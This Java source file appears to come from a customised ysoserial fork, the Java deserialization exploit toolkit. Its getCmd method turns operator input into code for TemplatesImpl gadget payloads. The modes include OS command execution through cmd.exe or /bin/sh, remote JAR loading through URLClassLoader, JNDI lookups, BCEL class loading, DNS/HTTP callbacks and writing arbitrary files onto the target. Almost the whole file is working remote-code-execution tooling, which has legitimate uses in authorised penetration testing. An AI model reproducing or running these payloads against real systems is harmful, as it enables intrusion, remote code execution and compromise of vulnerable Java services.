package ysoserial.payloads.custom;

import ysoserial.payloads.util.CommonUtil;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;

public class TemplatesImplUtil {
    public static String getCmd(String command) throws IOException {
        String cmd = null;
        if(command.toLowerCase().startsWith("sleep:")) {
            int time = Integer.valueOf(command.substring(6)) * 1000;
            cmd = String.format("java.lang.Thread.sleep(%sL);",time);
        } else if (command.toLowerCase().startsWith("dnslog:")){
            String dnslogDomain = command.substring(7);
            cmd = String.format("java.net.InetAddress.getAllByName(\"%s\");",dnslogDomain);
        } else if (command.toLowerCase().startsWith("httplog:")){
            String httplogURL = command.substring(8);
            cmd = String.format("new java.net.URL(\"%s\").getContent();",httplogURL);
        } else if (command.toLowerCase().startsWith("bcel:")) {
            String bcel = command.substring(5);
            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",bcel);
        } else if (command.toLowerCase().startsWith("bcel_class_file:")){
            String bcelClassFile = command.substring(16);
            String strBCEL = CommonUtil.classToBCEL(bcelClassFile);
            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",strBCEL);
        } else if(command.toLowerCase().startsWith("auto_cmd:")){
            /*
                String[] cmds = null;
                String osType = System.getProperty("os.name").toLowerCase();
                if(osType.contains("windows")){
                    cmds = new String[]{"cmd.exe","/c",strCmd};
                }else{
                    cmds = new String[]{"/bin/sh","-c",strCmd};
                }
                java.lang.Runtime.getRuntime().exec(cmds);
             */
            String strCmd = command.substring(9);
            cmd = String.format("String[] cmds = null;\n" +
                "String osType = System.getProperty(\"os.name\").toLowerCase();\n" +
                "if(osType.contains(\"windows\")){\n" +
                "    cmds = new String[]{\"cmd.exe\",\"/c\",\"%s\"};\n" +
                "}else{\n" +
                "    cmds = new String[]{\"/bin/sh\",\"-c\",\"%s\"};\n" +
                "}\n" +
                "java.lang.Runtime.getRuntime().exec(cmds);",strCmd,strCmd);
        } else if (command.toLowerCase().startsWith("uploadfile:")){
            String cmdInfo = command.substring(11);
            String localFilePath = cmdInfo.split("\\|")[0];
            String remoteFilePath = cmdInfo.split("\\|")[1];
            String fileByteCode = CommonUtil.fileContextToByteArray(localFilePath);
            cmd = String.format("new java.io.FileOutputStream(\"%s\").write(new byte[]{%s});",remoteFilePath,fileByteCode);
        } else if (command.toLowerCase().contains("loadjar:")){
            String cmdInfo = command.substring(8);
            String jarpath = cmdInfo.split("\\|")[0];
            String className = cmdInfo.split("\\|")[1];
            String args = cmdInfo.split("|")[2];
            cmd = String.format("java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"%s\")});" +
                "classLoader.loadClass(\"%s\").getConstructor(String.class).newInstance(\"%s\");",jarpath,className,args);
        } else if (command.toLowerCase().contains("jndi:")){
            String jndiURL = command.substring(5);
            cmd = String.format("new javax.naming.InitialContext().lookup(\"%s\");",jndiURL);
        } else {
            cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        }
        return cmd;
    }
}
